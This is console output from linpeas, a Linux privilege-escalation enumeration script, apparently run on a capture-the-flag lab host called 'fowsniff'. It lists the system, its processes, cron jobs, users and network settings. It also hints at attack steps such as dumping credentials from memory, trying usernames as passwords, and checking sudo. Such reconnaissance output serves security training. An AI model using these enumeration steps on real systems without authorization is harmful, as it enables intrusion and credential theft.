▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄
▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄
▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄
▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄
▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄
▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
▀▀▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
▀▀▀▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▀▀
▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

       /---------------------------------------------------------------------------\
       |                             Do you like PEASS?                            |
       |---------------------------------------------------------------------------|
       |         Become a Patreon    :     https://www.patreon.com/peass           |
       |         Follow on Twitter   :     @carlospolopm                           |
       |         Respect on HTB      :     SirBroccoli & makikvues                 |
       |---------------------------------------------------------------------------|
       |                                 Thank you!                                |
       \---------------------------------------------------------------------------/
        linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
LEGEND:
RED/YELLOW: 95% a PE vector
RED: You should take a look to it
LightCyan: Users with console
Blue: Users without console & mounted devs
Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
LightMagenta: Your username

Starting linpeas. Caching Writable Folders...

════════════════════════════════════╣ Basic information ╠════════════════════════════════════
OS: Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018
User & Groups: uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
Hostname: fowsniff
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

════════════════════════════════════╣ System Information ╠════════════════════════════════════
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018
Distributor ID: Ubuntu
Description: Ubuntu 16.04.4 LTS
Release: 16.04
Codename: xenial

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.16

╔══════════╣ USBCreator
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/home/baksteen/bin:/home/baksteen/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
New path exported: /home/baksteen/bin:/home/baksteen/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

╔══════════╣ Date & uptime
Sat Aug 14 02:28:15 EDT 2021
02:28:15 up 43 min, 1 user, load average: 0.17, 0.08, 0.03

╔══════════╣ System stats
Filesystem Size Used Avail Use% Mounted on
udev 226M 0 226M 0% /dev
tmpfs 49M 1.8M 47M 4% /run
/dev/xvda1 2.4G 1.4G 932M 60% /
tmpfs 244M 0 244M 0% /dev/shm
tmpfs 5.0M 0 5.0M 0% /run/lock
tmpfs 244M 0 244M 0% /sys/fs/cgroup
tmpfs 244M 0 244M 0% /run/shm
tmpfs 49M 0 49M 0% /run/user/1004
total used free shared buff/cache available
Mem: 498084 35480 164368 2012 298236 436276
Swap: 521212 0 521212

╔══════════╣ CPU info
Architecture: x86_64
CPU op-mode(s): 32-bit, 64-bit
Byte Order: Little Endian
CPU(s): 1
On-line CPU(s) list: 0
Thread(s) per core: 1
Core(s) per socket: 1
Socket(s): 1
NUMA node(s): 1
Vendor ID: GenuineIntel
CPU family: 6
Model: 63
Model name: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz
Stepping: 2
CPU MHz: 2400.062
BogoMIPS: 4800.12
Hypervisor vendor: Xen
Virtualization type: full
L1d cache: 32K
L1i cache: 32K
L2 cache: 256K
L3 cache: 30720K
NUMA node0 CPU(s): 0
Flags: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall nx rdtscp lm constant_tsc rep_good nopl xtopology eagerfpu pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm invpcid_single retpoline kaiser fsgsbase bmi1 avx2 smep bmi2 erms invpcid xsaveopt

╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
MAIL=/var/mail/baksteen
SSH*CLIENT=10.9.2.242 1762 22
USER=baksteen
SHLVL=1
HOME=/home/baksteen
SSH_TTY=/dev/pts/0
LOGNAME=baksteen
*=./linpeas.sh
XDG*SESSION_ID=1
TERM=xterm
PATH=/home/baksteen/bin:/home/baksteen/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
XDG_RUNTIME_DIR=/run/user/1004
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:_.tgz=01;31:_.arc=01;31:_.arj=01;31:_.taz=01;31:_.lha=01;31:_.lz4=01;31:_.lzh=01;31:_.lzma=01;31:_.tlz=01;31:_.txz=01;31:_.tzo=01;31:_.t7z=01;31:_.zip=01;31:_.z=01;31:_.Z=01;31:_.dz=01;31:_.gz=01;31:_.lrz=01;31:_.lz=01;31:_.lzo=01;31:_.xz=01;31:_.bz2=01;31:_.bz=01;31:_.tbz=01;31:_.tbz2=01;31:_.tz=01;31:_.deb=01;31:_.rpm=01;31:_.jar=01;31:_.war=01;31:_.ear=01;31:_.sar=01;31:_.rar=01;31:_.alz=01;31:_.ace=01;31:_.zoo=01;31:_.cpio=01;31:_.7z=01;31:_.rz=01;31:_.cab=01;31:_.jpg=01;35:_.jpeg=01;35:_.gif=01;35:_.bmp=01;35:_.pbm=01;35:_.pgm=01;35:_.ppm=01;35:_.tga=01;35:_.xbm=01;35:_.xpm=01;35:_.tif=01;35:_.tiff=01;35:_.png=01;35:_.svg=01;35:_.svgz=01;35:_.mng=01;35:_.pcx=01;35:_.mov=01;35:_.mpg=01;35:_.mpeg=01;35:_.m2v=01;35:_.mkv=01;35:_.webm=01;35:_.ogm=01;35:_.mp4=01;35:_.m4v=01;35:_.mp4v=01;35:_.vob=01;35:_.qt=01;35:_.nuv=01;35:_.wmv=01;35:_.asf=01;35:_.rm=01;35:_.rmvb=01;35:_.flc=01;35:_.avi=01;35:_.fli=01;35:_.flv=01;35:_.gl=01;35:_.dl=01;35:_.xcf=01;35:_.xwd=01;35:_.yuv=01;35:_.cgm=01;35:_.emf=01;35:_.ogv=01;35:_.ogx=01;35:_.aac=00;36:_.au=00;36:_.flac=00;36:_.m4a=00;36:_.mid=00;36:_.midi=00;36:_.mka=00;36:_.mp3=00;36:_.mpc=00;36:_.ogg=00;36:_.ra=00;36:_.wav=00;36:_.oga=00;36:_.opus=00;36:_.spx=00;36:\_.xspf=00;36:
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/home/baksteen
SSH_CONNECTION=10.9.2.242 1762 10.10.243.29 22
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmseg
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... lpstat Not Found
═╣ Is this a virtual machine? ..... Yes (xen)

════════════════════════════════════╣ Containers ╠════════════════════════════════════
╔══════════╣ Container related tools present
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No

════════════════════════════════════╣ Devices ╠════════════════════════════════════
╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
UUID=e2ac919a-2a01-42a2-9060-4b41853b727b / ext4 errors=remount-ro 0 1
UUID=e6326f02-44d8-4554-b35f-bafb01640610 none swap sw 0 0

tmpfs /run/shm tmpfs defaults,noexec,nosuid 0 0

╔══════════╣ Mounted disks information
diskutil Not Found

╔══════════╣ Mounted SMB Shares
smbutil Not Found

════════════════════════════════════╣ Available Software ╠════════════════════════════════════
╔══════════╣ Useful software

╔══════════╣ Installed Compiler
/usr/share/gcc-5

════════════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════════
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
root 1 0.2 1.1 37768 5860 ? Ss 01:44 0:06 /sbin/init splash
root 205 0.0 0.5 27704 2708 ? Ss 01:45 0:00 /lib/systemd/systemd-journald
root 263 0.0 0.8 44664 4164 ? Ss 01:45 0:01 /lib/systemd/systemd-udevd
systemd+ 316 0.0 0.5 100324 2540 ? Ssl 01:45 0:00 /lib/systemd/systemd-timesyncd
root 554 0.0 0.5 16124 2576 ? Ss 01:45 0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root 606 0.0 0.6 29008 3016 ? Ss 01:45 0:00 /usr/sbin/cron -f
root 618 0.0 1.2 275876 6256 ? Ssl 01:45 0:00 /usr/lib/accountsservice/accounts-daemon[0m
root 623 0.0 0.6 28544 3072 ? Ss 01:45 0:00 /lib/systemd/systemd-logind
message+ 625 0.0 0.7 42900 3808 ? Ss 01:45 0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
syslog 636 0.0 0.6 256392 3276 ? Ssl 01:45 0:00 /usr/sbin/rsyslogd -n
root 682 0.0 1.0 65508 5276 ? Ss 01:45 0:00 /usr/sbin/sshd -D
baksteen 1050 0.0 0.8 92832 4148 ? S 02:02 0:00 _ sshd: baksteen@pts/0
baksteen 1053 0.0 1.0 22268 5000 pts/0 Ss 02:02 0:00 _ -bash
baksteen 1112 0.2 0.4 5140 2356 pts/0 S+ 02:28 0:00 _ /bin/sh ./linpeas.sh
baksteen 2145 0.0 0.1 5140 772 pts/0 S+ 02:28 0:00 _ /bin/sh ./linpeas.sh
baksteen 2149 0.0 0.6 37508 3460 pts/0 R+ 02:28 0:00 | _ ps fauxwww
baksteen 2148 0.0 0.1 5140 772 pts/0 S+ 02:28 0:00 _ /bin/sh ./linpeas.sh
root 718 0.0 0.5 18036 2648 ? Ss 01:45 0:00 /usr/sbin/dovecot
dovecot 725 0.0 0.1 9524 920 ? S 01:45 0:00 _ dovecot/anvil
root 726 0.0 0.4 9656 2276 ? S 01:45 0:00 _ dovecot/log
root 743 0.0 0.3 15936 1824 tty1 Ss+ 01:45 0:00 /sbin/agetty --noclear tty1 linux
root 745 0.0 0.4 15752 2252 ttyS0 Ss+ 01:45 0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root 767 0.0 0.8 71584 4256 ? Ss 01:45 0:00 /usr/sbin/apache2 -k start
www-data 771 0.0 0.7 360740 3956 ? Sl 01:45 0:00 _ /usr/sbin/apache2 -k start
www-data 772 0.0 0.7 360740 3956 ? Sl 01:45 0:00 _ /usr/sbin/apache2 -k start
root 924 0.0 0.8 65408 4376 ? Ss 01:45 0:00 /usr/lib/postfix/sbin/master
postfix 928 0.0 0.8 67476 4368 ? S 01:45 0:00 _ pickup -l -t unix -u -c
postfix 929 0.0 0.8 67524 4448 ? S 01:45 0:00 _ qmgr -l -t unix -u
baksteen 1026 0.0 0.9 45264 4512 ? Ss 02:02 0:00 /lib/systemd/systemd --user
baksteen 1028 0.0 0.3 61220 1960 ? S 02:02 0:00 \_ (sd-pam)

╔══════════╣ Binary processes permissions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
0 lrwxrwxrwx 1 root root 4 Feb 17 2016 /bin/sh -> dash
1.6M -rwxr-xr-x 1 root root 1.6M Feb 1 2018 /lib/systemd/systemd
320K -rwxr-xr-x 1 root root 319K Feb 1 2018 /lib/systemd/systemd-journald
608K -rwxr-xr-x 1 root root 605K Feb 1 2018 /lib/systemd/systemd-logind
140K -rwxr-xr-x 1 root root 139K Feb 1 2018 /lib/systemd/systemd-timesyncd
444K -rwxr-xr-x 1 root root 443K Feb 1 2018 /lib/systemd/systemd-udevd
44K -rwxr-xr-x 1 root root 44K Nov 30 2017 /sbin/agetty
476K -rwxr-xr-x 1 root root 476K Mar 1 2018 /sbin/dhclient
0 lrwxrwxrwx 1 root root 20 Feb 1 2018 /sbin/init -> /lib/systemd/systemd
220K -rwxr-xr-x 1 root root 219K Jan 12 2017 /usr/bin/dbus-daemon[0m
164K -rwxr-xr-x 1 root root 162K Nov 3 2016 /usr/lib/accountsservice/accounts-daemon[0m
40K -rwxr-xr-x 1 root root 38K Jan 17 2018 /usr/lib/postfix/sbin/master
648K -rwxr-xr-x 1 root root 647K Sep 18 2017 /usr/sbin/apache2
44K -rwxr-xr-x 1 root root 44K Apr 5 2016 /usr/sbin/cron
80K -rwxr-xr-x 1 root root 79K Feb 27 2018 /usr/sbin/dovecot
588K -rwxr-xr-x 1 root root 586K Apr 5 2016 /usr/sbin/rsyslogd
776K -rwxr-xr-x 1 root root 773K Jan 18 2018 /usr/sbin/sshd

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND PID TID USER FD TYPE DEVICE SIZE/OFF NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root 722 Apr 5 2016 /etc/crontab

/etc/cron.d:
total 16
drwxr-xr-x 2 root root 4096 Mar 8 2018 .
drwxr-xr-x 87 root root 4096 Dec 9 2018 ..
-rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder
-rw-r--r-- 1 root root 191 Mar 8 2018 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x 2 root root 4096 Mar 8 2018 .
drwxr-xr-x 87 root root 4096 Dec 9 2018 ..
-rwxr-xr-x 1 root root 539 Apr 5 2016 apache2
-rwxr-xr-x 1 root root 1474 Sep 26 2017 apt-compat
-rwxr-xr-x 1 root root 355 May 22 2012 bsdmainutils
-rwxr-xr-x 1 root root 1597 Nov 26 2015 dpkg
-rwxr-xr-x 1 root root 372 May 6 2015 logrotate
-rwxr-xr-x 1 root root 1293 Nov 6 2015 man-db
-rwxr-xr-x 1 root root 435 Nov 18 2014 mlocate
-rwxr-xr-x 1 root root 249 Nov 12 2015 passwd
-rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder
-rwxr-xr-x 1 root root 3449 Feb 26 2016 popularity-contest

/etc/cron.hourly:
total 12
drwxr-xr-x 2 root root 4096 Mar 8 2018 .
drwxr-xr-x 87 root root 4096 Dec 9 2018 ..
-rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x 2 root root 4096 Mar 8 2018 .
drwxr-xr-x 87 root root 4096 Dec 9 2018 ..
-rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x 2 root root 4096 Mar 8 2018 .
drwxr-xr-x 87 root root 4096 Dec 9 2018 ..
-rwxr-xr-x 1 root root 86 Apr 13 2016 fstrim
-rwxr-xr-x 1 root root 771 Nov 6 2015 man-db
-rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

╔══════════╣ Services
╚ Search for outdated versions
[ + ] apache-htcacheclean
[ + ] apache2
[ + ] apparmor
[ - ] bootmisc.sh
[ - ] checkfs.sh
[ - ] checkroot-bootclean.sh
[ - ] checkroot.sh
[ + ] console-setup
[ + ] cron
[ + ] dbus
[ + ] dovecot
[ + ] grub-common
[ - ] hostname.sh
[ - ] hwclock.sh
[ + ] irqbalance
[ + ] keyboard-setup
[ - ] killprocs
[ + ] kmod
[ - ] mountall-bootclean.sh
[ - ] mountall.sh
[ - ] mountdevsubfs.sh
[ - ] mountkernfs.sh
[ - ] mountnfs-bootclean.sh
[ - ] mountnfs.sh
[ + ] networking
[ + ] ondemand
[ - ] plymouth
[ - ] plymouth-log
[ + ] postfix
[ + ] procps
[ + ] rc.local
[ + ] resolvconf
[ - ] rsync
[ + ] rsyslog
[ - ] sendsigs
[ + ] ssh
[ + ] udev
[ + ] ufw
[ - ] umountfs
[ - ] umountnfs.sh
[ - ] umountroot
[ + ] urandom
[ - ] uuidd

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
NEXT LEFT LAST PASSED UNIT ACTIVATES
Sat 2021-08-14 06:31:44 EDT 4h 3min left Sat 2021-08-14 01:45:26 EDT 42min ago apt-daily-upgrade.timer apt-daily-upgrade.service
Sat 2021-08-14 06:34:43 EDT 4h 6min left Sat 2021-08-14 01:45:26 EDT 42min ago apt-daily.timer apt-daily.service
Sun 2021-08-15 02:00:44 EDT 23h left Sat 2021-08-14 02:00:44 EDT 27min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a n/a n/a n/a ureadahead-stop.timer ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

╔══════════╣ HTTP sockets
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf ( <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf ( <policy user="systemd-resolve">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
NAME PID PROCESS USER CONNECTION UNIT SESSION DESCRIPTION
:1.0 1 systemd root :1.0 init.scope - -
:1.1 623 systemd-logind root :1.1 systemd-logind.service - -
:1.128 4405 busctl baksteen :1.128 session-1.scope 1 -
:1.2 618 accounts-daemon root :1.2 accounts-daemon.service - -
com.ubuntu.LanguageSelector - - - (activatable) - -
org.freedesktop.Accounts 618 accounts-daemon root :1.2 accounts-daemon.service - -
org.freedesktop.DBus 625 dbus-daemon messagebus org.freedesktop.DBus dbus.service - -
org.freedesktop.hostname1 - - - (activatable) - -
org.freedesktop.locale1 - - - (activatable) - -
org.freedesktop.login1 623 systemd-logind root :1.1 systemd-logind.service - -
org.freedesktop.network1 - - - (activatable) - -
org.freedesktop.resolve1 - - - (activatable) - -
org.freedesktop.systemd1 1 systemd root :1.0 init.scope - -
org.freedesktop.timedate1 - - - (activatable) - -

════════════════════════════════════╣ Network Information ╠════════════════════════════════════
╔══════════╣ Hostname, hosts and DNS
fowsniff
127.0.0.1 localhost
127.0.1.1 fowsniff

::1 localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 10.0.0.2
search eu-west-1.compute.internal

╔══════════╣ Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found

╔══════════╣ Interfaces

# symbolic names for networks, see networks(5) for more information

link-local 169.254.0.0
eth0 Link encap:Ethernet HWaddr 02:a0:5d:8c:09:af
inet addr:10.10.243.29 Bcast:10.10.255.255 Mask:255.255.0.0
inet6 addr: fe80::a0:5dff:fe8c:9af/64 Scope:Link
UP BROADCAST RUNNING MULTICAST MTU:9001 Metric:1
RX packets:5321 errors:0 dropped:0 overruns:0 frame:0
TX packets:4032 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000
RX bytes:841535 (841.5 KB) TX bytes:885161 (885.1 KB)

lo Link encap:Local Loopback
inet addr:127.0.0.1 Mask:255.0.0.0
inet6 addr: ::1/128 Scope:Host
UP LOOPBACK RUNNING MTU:65536 Metric:1
RX packets:160 errors:0 dropped:0 overruns:0 frame:0
TX packets:160 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1
RX bytes:11840 (11.8 KB) TX bytes:11840 (11.8 KB)

╔══════════╣ Networks and neighbours
Kernel IP routing table
Destination Gateway Genmask Flags Metric Ref Use Iface
default ip-10-10-0-1.eu 0.0.0.0 UG 0 0 0 eth0
10.10.0.0 \* 255.255.0.0 U 0 0 0 eth0
Address HWtype HWaddress Flags Mask Iface
ip-10-10-0-1.eu-west-1. ether 02:c8:85:b5:5a:aa C eth0

╔══════════╣ Iptables rules
iptables rules Not Found

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp 0 0 0.0.0.0:22 0.0.0.0:_ LISTEN -
tcp 0 0 127.0.0.1:25 0.0.0.0:_ LISTEN -
tcp 0 0 0.0.0.0:110 0.0.0.0:_ LISTEN -
tcp 0 0 0.0.0.0:143 0.0.0.0:_ LISTEN -
tcp6 0 0 :::22 :::_ LISTEN -
tcp6 0 0 :::110 :::_ LISTEN -
tcp6 0 0 :::143 :::_ LISTEN -
tcp6 0 0 :::80 :::_ LISTEN -

╔══════════╣ Can I sniff with tcpdump?
No

════════════════════════════════════╣ Users Information ╠════════════════════════════════════
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Clipboard or highlighted text?
xsel and xclip Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)
gdb wasn't found in PATH

╔══════════╣ Checking doas.conf
doas.conf Not Found

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
baksteen:x:1004:100::/home/baksteen:/bin/bash
mauer:x:1002:100::/home/mauer:/bin/bash
mursten:x:1005:100::/home/mursten:/bin/bash
mustikka:x:1008:100::/home/mustikka:/bin/bash
parede:x:1001:100::/home/parede:/bin/bash
root:x:0:0:root:/root:/bin/bash
sciana:x:1003:100::/home/sciana:/bin/bash
seina:x:1007:100::/home/seina:/bin/bash
stone:x:1000:1000:stone,,,:/home/stone:/bin/bash
tegel:x:1006:100::/home/tegel:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(stone) gid=1000(stone) groups=1000(stone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),119(lpadmin),120(sambashare)
uid=1001(parede) gid=100(users) groups=100(users),1005(parede)
uid=1002(mauer) gid=100(users) groups=100(users),1002(mauer)
uid=1003(sciana) gid=100(users) groups=100(users),1006(sciana)
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
uid=1005(mursten) gid=100(users) groups=100(users),1003(mursten)
uid=1006(tegel) gid=100(users) groups=100(users),1008(tegel)
uid=1007(seina) gid=100(users) groups=100(users),1007(seina)
uid=1008(mustikka) gid=100(users) groups=100(users),1004(mustikka)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(\_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=107(uuidd) gid=111(uuidd) groups=111(uuidd)
uid=108(postfix) gid=115(postfix) groups=115(postfix)
uid=109(dovecot) gid=117(dovecot) groups=117(dovecot),8(mail)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(dovenull) gid=118(dovenull) groups=118(dovenull)
uid=111(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
02:28:19 up 43 min, 1 user, load average: 0.39, 0.13, 0.04
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
baksteen pts/0 10.9.2.242 02:02 11.00s 0.07s 0.00s /bin/sh ./linpeas.sh

╔══════════╣ Last logons
baksteen pts/0 Sat Aug 14 02:02:31 2021 still logged in 10.9.2.242
reboot system boot Sat Aug 14 01:45:03 2021 still running 0.0.0.0
reboot system boot Sun Dec 9 09:11:20 2018 - Sun Dec 9 09:14:23 2018 (00:03) 0.0.0.0

wtmp begins Tue Mar 13 17:11:03 2018

╔══════════╣ Last time logon each user
Username Port From Latest
root Wed Dec 31 19:00:10 -0500 1969
stone pts/2 192.168.7.36 Tue Mar 13 14:52:13 -0400 2018
baksteen pts/0 10.9.2.242 Sat Aug 14 02:02:31 -0400 2021

╔══════════╣ Password policy
PASS_MAX_DAYS 99999
PASS_MIN_DAYS 0
PASS_WARN_AGE 7
ENCRYPT_METHOD SHA512

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!

════════════════════════════════════╣ Software Information ╠════════════════════════════════════
╔══════════╣ MySQL version
mysql Not Found

═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. No
╔══════════╣ Searching mysql credentials and exec

╔══════════╣ Analyzing PostgreSQL Files (limit 70)
Version: psql Not Found

pgadmin\*.db Not Found

pg_hba.conf Not Found

postgresql.conf Not Found

